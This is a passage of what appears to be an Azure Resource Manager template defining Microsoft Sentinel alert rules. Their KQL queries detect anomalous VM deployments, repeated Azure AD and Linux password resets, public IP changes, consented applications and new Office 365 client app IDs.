              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-197')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-197')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-197: [RBA] Azure Activity - Anomalous Count of Resource Creation",
          "description": "This alert indicates when an anomalous number of VM creations or deployment activities occur in Azure via the AzureActivity log. MITRE: T1578 Category: Azure Activity tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "let szOperationNames = dynamic(['Microsoft.Compute/virtualMachines/write', 'Microsoft.Resources/deployments/write']);\nlet starttime = 7d;\nlet endtime = 1d;\nAzureActivity\n| where TimeGenerated between (startofday(ago(starttime)) .. startofday(ago(endtime)))\n//Extract Operation Name Value from JSON if not available\n| extend Action = tostring(parse_json(Authorization).action)\n| extend OperationNameValue = iff(isempty(OperationNameValue), Action, OperationNameValue)      \n| where OperationNameValue in~ (szOperationNames)\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated), ActivityTimeStamp = makelist(TimeGenerated), ActivityStatusValue = makelist(ActivityStatusValue), \nOperationIds = makelist(OperationId), CallerIpAddress = makelist(CallerIpAddress), CorrelationId = makelist(CorrelationId) \nby ResourceId, Caller, OperationNameValue, Resource, ResourceGroup\n| mvexpand CallerIpAddress\n| where isnotempty(CallerIpAddress)\n| make-series dResourceCount=dcount(ResourceId)  default=0 on StartTimeUtc in range(startofday(ago(7d)), now(), 1d) \nby Caller, tostring(ActivityTimeStamp), tostring(ActivityStatusValue), tostring(OperationIds), tostring(CallerIpAddress), tostring(CorrelationId), ResourceId, OperationNameValue, Resource, ResourceGroup\n| extend (RSquare,Slope,Variance,RVariance,Interception,LineFit)=series_fit_line(dResourceCount)\n| where Slope > 0.2\n| join kind=leftsemi (\nAzureActivity\n| where TimeGenerated between (startofday(ago(endtime)) .. now())\n//Extract Operation Name Value from JSON if not available\n| extend Action = tostring(parse_json(Authorization).action)\n| extend OperationNameValue = iff(isempty(OperationNameValue), Action, OperationNameValue)      \n| where OperationNameValue in~ (szOperationNames)\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated), ActivityTimeStamp = makelist(TimeGenerated), ActivityStatusValue = makelist(ActivityStatusValue), \nOperationIds = makelist(OperationId), CallerIpAddress = makelist(CallerIpAddress), CorrelationId = makelist(CorrelationId) \nby ResourceId, Caller, OperationNameValue, Resource, ResourceGroup\n| mvexpand CallerIpAddress\n| where isnotempty(CallerIpAddress)\n| make-series dResourceCount=dcount(ResourceId)  default=0 on StartTimeUtc in range(startofday(ago(1d)), now(), 1d) \nby Caller, tostring(ActivityTimeStamp), tostring(ActivityStatusValue), tostring(OperationIds), tostring(CallerIpAddress), tostring(CorrelationId), ResourceId, OperationNameValue, Resource, ResourceGroup\n| extend (RSquare,Slope,Variance,RVariance,Interception,LineFit)=series_fit_line(dResourceCount)\n| where Slope > 0.2    \n) on Caller, CallerIpAddress        \n| mvexpand todynamic(ActivityTimeStamp), todynamic(ActivityStatusValue), todynamic(OperationIds), todynamic(CorrelationId)\n| extend timestamp = ActivityTimeStamp, AccountCustomEntity = Caller, IPCustomEntity = CallerIpAddress",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [
            "T1578"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-073')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-073')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-073: [RBA] Azure AD - Multiple Password Resets",
          "description": "More than one Azure AD password change within one day. MITRE: T1098 Category: Azure AD tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let timeframe = 1d;\nlet PerUserThreshold = 5;\nlet TotalThreshold = 100;\nlet action = dynamic(['change', 'changed', 'reset']);\nlet pWord = dynamic(['password', 'credentials']);\nAuditLogs\n| where TimeGenerated between ( ago(timeframe) .. now())\n| where Category =~ 'UserManagement'\n| where OperationName has_any (pWord) and OperationName has_any (action)\n| where OperationName !contains ('Self-service')\n| extend AccountType = tostring(TargetResources[0].type), AccountName = tostring(TargetResources[0].userPrincipalName), TargetResourceName = tolower(tostring(TargetResources[0].displayName)), InitiatorName = tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName), InitiatorAadUserId = tostring(parse_json(tostring(InitiatedBy.user)).id), InitiatorIP = tostring(parse_json(tostring(InitiatedBy.user)).ipAddress), InitiatorAppSPID = tostring(parse_json(tostring(InitiatedBy.app)).servicePrincipalId), InitiatorAppName = tostring(parse_json(tostring(InitiatedBy.app)).displayName)\n| project TimeGenerated, AccountName, InitiatorName, InitiatorAadUserId, InitiatorIP, Result, InitiatorAppSPID,InitiatorAppName\n| where InitiatorName !in (A073_WHITELISTED_ACCOUNTS)\n| summarize First=min(TimeGenerated), Last=max(TimeGenerated), EventCount=count(), NumberUniqueAccountResets=dcount(AccountName), Accounts=make_set(AccountName), Events=make_set(pack_all(), MaxSize=5) by InitiatorAppName, InitiatorAppSPID, InitiatorName, InitiatorAadUserId, InitiatorIP\n| where InitiatorName !in (A073_WHITELISTED_ACCOUNTS)\n| where EventCount > 2\n| parse InitiatorName with UserName '@' UserDNS\n| project First, Last, InitiatorName, InitiatorIP, InitiatorAadUserId, EventCount, NumberUniqueAccountResets, Accounts, Events, UserName, UserDNS",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": {
            "Accounts": "Accounts",
            "UniqueResets": "NumberUniqueAccountResets"
          },
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "InitiatorIP"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "UserName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "UserDNS"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-442')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-442')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-442: [RBA] Azure Activity - VM Modification With Public IP",
          "description": "This alert identifies a public IP address write (modification or create) on a Azure Virtual Machine MITRE: T1070,T1562 Category: Azure Activity tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let ingested_lookback = 1d; // earliest [ingest time] boundary\nlet generated_lookback = 1d; // earliest [log time] boundary\nlet alert_bin=1d;\nlet OperationNames = dynamic([\"microsoft.compute/virtualMachines/write\", \"microsoft.resources/deployments/write\"]);\nAzureActivity\n| where TimeGenerated between (ago(generated_lookback) .. now()) and ingestion_time() > ago(ingested_lookback)\n| extend Action = tostring(parse_json(Authorization).action)\n| extend OperationNameValue = iff(isempty(OperationNameValue), Action, OperationNameValue)\n| where OperationNameValue in~ (OperationNames)\n| where Properties contains \"publicipaddress\"\n| summarize argmax(TimeGenerated, *) by CorrelationId\n| where max_TimeGenerated_ActivityStatusValue in~ ('Succeeded', 'Success')\n| where max_TimeGenerated_ResourceGroup matches regex A442_WHITELISTED_HOSTS_REGEX == false\n| where  max_TimeGenerated_Caller !in~ (A442_WHITELISTED_CALLER)\n| summarize TimeGenerated=min(max_TimeGenerated), EventCount=count(), ResourceGroups = make_set(max_TimeGenerated_ResourceGroup, 5), ResourceGroupCount=dcount(max_TimeGenerated_ResourceGroup) by Caller=max_TimeGenerated_Caller, IP=max_TimeGenerated_CallerIpAddress, bin(max_TimeGenerated, alert_bin)\n| extend AccountCustomEntity = Caller, IPCustomEntity=IP\n| project EventCount, TimeGenerated, ResourceGroups, ResourceGroupCount, Caller, IP, IPCustomEntity, AccountCustomEntity",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [
            "T1070",
            "T1562"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-199')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-199')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-199: [RBA] Azure Activity - Suspicious Resource Deployment",
          "description": "This alert identifies when a Virtual Machine has been created or updated by a user that has not created or updated a virtual machine in the last 14 days. MITRE: T1496 Category: Azure Activity tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let szOperationNames = dynamic(['Microsoft.Compute/virtualMachines/write', 'Microsoft.Resources/deployments/write']);\nlet generated_lookback = 1d;\nlet historical_lookback = 14d;\nlet alert_bin = 1d;\nlet HistoricalActivity = AzureActivity\n| where TimeGenerated between (ago(historical_lookback) .. ago(generated_lookback))\n//Extract Operation Name Value from JSON if not available\n| extend Action = tostring(parse_json(Authorization).action)\n| extend OperationNameValue = iff(isempty(OperationNameValue), Action, OperationNameValue)\n| where OperationNameValue in~ (szOperationNames)\n| summarize TimeGenerated=min(TimeGenerated),count(), ActivityStatusValue=make_set(ActivityStatusValue), CallerIPAddress=make_set_if(CallerIpAddress,isnotempty(CallerIpAddress)) by CorrelationId, Caller, OperationNameValue;\nlet CurrentActivity=AzureActivity\n| where TimeGenerated between (ago(generated_lookback) .. now())\n| extend Action = tostring(parse_json(Authorization).action)\n| extend OperationNameValue = iff(isempty(OperationNameValue), Action, OperationNameValue)\n| where OperationNameValue in~ (szOperationNames)\n| project Caller, CallerIpAddress, OperationNameValue, ResourceId, ResourceGroup, TimeGenerated, ActivityStatusValue, CorrelationId;\nHistoricalActivity | join kind=rightanti CurrentActivity on Caller\n//There is no RBA value to the exclusions so they are removed from the results instead of creating an RBA event\n| extend ExcludedCaller = iff(Caller in (A199_EXCLUDED_CALLER), true, false)\n| extend ExcludedIP = iff(CallerIpAddress in (A199_EXCLUDED_IP), true, false)\n| where not(ExcludedCaller) or not(ExcludedIP)\n| summarize TimeGenerated=min(TimeGenerated),Count=dcount(CorrelationId), ActivityStatusValue=make_set(ActivityStatusValue), CallerIPAddress=make_set_if(CallerIpAddress,isnotempty(CallerIpAddress)), Operations=make_set(OperationNameValue), ResourceID=make_set(ResourceId, MaxSize=5), ResourceIDCount=dcount(ResourceId), ResourceGroups=make_set(ResourceGroup, MaxSize=5) by Caller, bin(TimeGenerated, alert_bin)\n| extend IP1 = CallerIPAddress[0], IP2 = CallerIPAddress[1]\n| extend Event = pack('TimeGenerated', TimeGenerated, 'SourceIP', CallerIPAddress, 'SourceUser', Caller, 'Details', pack('ResourceID', ResourceID, 'ActivityStatusValue', ActivityStatusValue, 'ResourceGroups', ResourceGroups), 'SystemAlertPlatform', 'Correlation', 'LogSourceHost', 'AzureActivity')\n| project\n    TimeGenerated,\n    Caller,\n    CallerIPAddress,\n    ResourceID,\n    ActivityStatusValue,\n    ResourceIDCount,\n    Count,\n    Event,\n    IP1,\n    IP2",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Impact"
          ],
          "techniques": [
            "T1496"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": {
            "Event": "Event"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "Caller"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IP1"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IP2"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-229')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-229')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-229: [RBA] Azure AD - Consented Azure Applications",
          "description": "This alert identifies Azure applications that the users consented to. Some of the application might be malicious. MITRE: T1496 Category: Azure AD tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "AuditLogs\n| where TimeGenerated >= ago(1h)\n|where OperationName == 'Consent to application'\n| extend ModProps = TargetResources.[0].modifiedProperties\n| extend IPAddress = iff(isnotempty(tostring(parse_json(tostring(InitiatedBy.user)).ipAddress)),  tostring(parse_json(tostring(InitiatedBy.user)).ipAddress), tostring(parse_json(tostring(InitiatedBy.app)).ipAddress))\n| extend InitiatedBy = iff(isnotempty(tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName)),  tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName), tostring(parse_json(tostring(InitiatedBy.app)).displayName))\n| extend TargetResourceName = tolower(tostring(TargetResources.[0].displayName))\n| where (TargetResourceName has_any (WHITELISTED_APPS)) == false\n| summarize User=make_set(InitiatedBy, 5), NumberOfUsers=dcount(InitiatedBy), IPAddresses = make_set(IPAddress, 5) by Apps=TargetResourceName\n| extend IPCustomEntity = tostring(IPAddresses[0])\n| extend  AccountCustomEntity = tostring(User[0])\n| sort by NumberOfUsers desc, Apps asc",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Impact"
          ],
          "techniques": [
            "T1496"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-074')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-074')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-074: [RBA] Linux - Multiple User Password Resets",
          "description": "This rule identifies Linux password changes in Syslog and provides a summary of activity by account.\n\nA password change by itself is not unusual or suspcious but will be used in conjunction with other events to identify anmolous behavior before or after the password change. MITRE: T1098 Category: Linux tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "// The query_now parameter represents the time (in UTC) at which the scheduled analytics rule ran to produce this alert.\nlet ingested_lookback = 1d; // earliest [ingest time] boundary\nlet generated_lookback = 1d; // earliest [log time] boundary\nlet alert_bin = 24h;\nlet PerUserThreshold = 5;\nlet TotalThreshold = 100;\nlet action = dynamic(['change', 'changed', 'reset']);\nlet pWord = dynamic(['password', 'credentials']);\nSyslog\n| where TimeGenerated > ago(generated_lookback) and ingestion_time() > ago(ingested_lookback)\n| where Facility in ('auth','authpriv')\n| where SyslogMessage has_any (pWord) and SyslogMessage has_any (action)\n| where not(SyslogMessage has_any ('has expired', 'changed password expiry', 'change user'))\n| parse SyslogMessage with * 'password changed for' Account\n| where isnotempty(Account)\n| summarize ResetCount=count(), TimeGenerated=min(TimeGenerated), Hosts=make_set(Computer, MaxSize=5), HostCount=dcount(Computer), IPs=make_set(HostIP, MaxSize=5), IPCount=dcount(HostIP) by Account, bin(TimeGenerated, alert_bin)\n| extend Event = pack('TimeGenerated', TimeGenerated, 'TargetHost', Hosts, 'TargetUser', Account, 'TargetIP', IPs)\n| extend HostName1 = Hosts[0], HostName2=Hosts[1]\n| extend IP1 = IPs[0], IP2 = IPs[1]\n| project TimeGenerated, Hosts, HostCount, IPs, IPCount, Account, Event, HostName1, HostName2, IP1, IP2, ResetCount",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": {
            "Event": "Event"
          },
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IP1"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IP2"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "Account"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "HostName1"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "HostName2"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-10624')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-10624')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-10624: [RBA] O365 - New Client App ID",
          "description": "This alert identifies access to Office 365 from a new client App ID not seen in the previous seven days MITRE: T1078,T1114 Category: Office 365 tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let start_time = 7d;\nlet latency = 1h;\nlet alert_bin = 1h;\nlet end_time = now();\n      let global_config = dynamic({\n          'EXCLUSION': dynamic([{}])\n      });\n      let rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV10624_CONFIG['RBASCORE']),1.0);\n      let exclusions = array_concat(global_config['EXCLUSION'], BV10624_CONFIG['EXCLUSION'], dynamic([{}]));\n      let rba_score_calculator = (table_parameter: (visibility:dynamic), RuleId_constant:string){\n              let global_override = toscalar(bv_rba_global_override | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, GlobalRBAMultiplier, GlobalOverrideRBA) by RuleId\n| project bag_pack('GlobalRBAMultiplier',GlobalRBAMultiplier,'GlobalOverrideRBA',GlobalOverrideRBA));\n              let client_override = toscalar(BV_RBA_CLIENT_OVERRIDE | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, ClientRBAMultiplier, ClientOverrideRBA) by RuleId\n| project bag_pack('ClientRBAMultiplier',ClientRBAMultiplier,'ClientOverrideRBA',ClientOverrideRBA));\n              table_parameter\n              | extend rba_multiplier = coalesce(toreal(client_override['ClientRBAMultiplier']),toreal(global_override['GlobalRBAMultiplier']), 1.0)\n              | extend rba_multiplier = iff(rba_multiplier < 0.1, 0.1, rba_multiplier)\n              | extend rba_multiplier = iff(rba_multiplier > 3, 3.0, rba_multiplier)\n              | extend rba_override = coalesce(toreal(client_override['ClientOverrideRBA']),toreal(global_override['GlobalOverrideRBA']), toreal(rba_score), 1.0)\n              | extend ModifiedRBAScore = toreal(rba_override) * rba_multiplier\n              | extend ModifiedRBAScore = case(\n                ModifiedRBAScore > 10, 10.0\n                , ModifiedRBAScore <0.1, 0.1\n                , ModifiedRBAScore\n              )\n              | extend bv_alarm_rba_score = iff(visibility contains '1', 0.0, ModifiedRBAScore)\n      };\n      let description = (table_parameter: (*)){\n          table_parameter\n          | extend all_data = pack_all()\n          | extend keys = bag_keys(all_data)\n          | mv-apply k = keys to typeof(string) on (\n              extend dynamic_entity = parse_json(all_data[k])\n              | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw', strcat(\n                  case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(all_data[k])[0]) , strcat(k, ': \\n* ', substring(strcat_array(array_slice(all_data[k],0,3),'\\n* '),0,100), '\\n')\n                  , isnotempty(array_sort_desc(pack_array(all_data[k]))[0]), strcat(k,': ', all_data[k])\n                  , '')\n                  ),'')\n                  | summarize ExtendedDescription = make_set(ExtendedDescription)\n          )\n          | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n      };\n      let exclusion_filter = (table_parameter: (*)){\n                table_parameter\n                | extend all_data = pack_all()\n                | mv-apply e = exclusions on (\n                    extend keys = bag_keys(e)\n                    | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n                    | mv-apply k = keys to typeof(string) on (\n                        extend list = split(e[k],',')\n                        | mv-apply l = list to typeof(string) on (\n                            extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                            | mv-apply i = item to typeof(string) on (\n                                extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                                | summarize excluded_count = countif(compare)\n                                | extend item_excluded = excluded_count > 0\n                            )\n                            | summarize excluded_count = countif(item_excluded)\n                            | extend item_excluded = excluded_count > 0\n                        )\n                        | summarize excluded_list_item = countif(item_excluded > 0)\n                    )\n                    | extend exclusion_matched =  key_count == excluded_list_item and key_count != 0\n                    | extend visibility = iff(exclusion_matched and isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n                    | extend bv_exclusion_reason = iff(exclusion_matched, parse_json(e.metadata).reason, '')\n                    | summarize exclusion_matched=make_set(exclusion_matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n                )\n                | extend drop_event = iff(exclusion_matched contains \"true\", true, false)\n      };\nOfficeActivity\n|where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time)\n| where isnotempty(AppId) or isnotempty(ClientAppId)\n| summarize\nbv_start_time = min(TimeGenerated)\n, bv_end_time = max(TimeGenerated)\n, bv_client_app_id = make_set(ClientAppId)\n, bv_src_user = make_set(UserId)\n, bv_src_ip = make_set(Client_IPAddress)\n, bv_src_user_normalized = make_set(bv_cim_normalize_username(UserId))\n, bv_event_count = count()\nby\n  bv_operation=Operation\n  , bv_app_id = AppId\n| extend bv_src_user_count = array_length(bv_src_user)\n| extend bv_src_ip_count = array_length(bv_src_ip)\n| where bv_start_time > ago(1h)\n| invoke exclusion_filter()\n| invoke rba_score_calculator('BV-10624')\n//removes all events with a visibility of 0\n| where visibility !contains '0'\n| extend sourcetype = 'OfficeActivity'\n| invoke description()\n| extend bv_src_ip1 = bv_src_ip[0]\n| extend bv_src_user1 = bv_src_user[0]\n| extend bv_src_user2 = bv_src_user[1]\n| extend bv_alarm_attacker_entities = bv_src_ip\n| extend bv_alarm_victim_entities = bv_src_user\n| extend bv_rule_version = '1.4.3801'\n| extend bv_rule_timestamp = '1689612966.5625834'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.4.3801 bv_rule_timestamp: 1689612966.5625834'\n| project-keep\n    bv_*\n    , ExtendedDescription\n    , sourcetype",
          "queryFrequency": "PT1H",
          "queryPeriod": "P7D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion",
            "Persistence",
            "PrivilegeEscalation",
            "InitialAccess",
            "Collection"
          ],
          "techniques": [
            "T1078",
            "T1114"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This alert identifies access to Office 365 from a new client App ID not seen in the previous seven days\n https://www.microsoft.com/en-us/security/blog/2023/07/14/analysis-of-storm-0558-techniques-for-unauthorized-email-access/\n\n {{ExtendedDescription}}\n \n tag: RBA\n Category: Office 365\n{{bv_rule_combined_string}}"
          },
          "customDetails": {
            "VictimEntity": "bv_alarm_victim_entities",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "RBAScore": "bv_alarm_rba_score"
          },
          "entityMappings": [
            {
              "entityType": "Account",
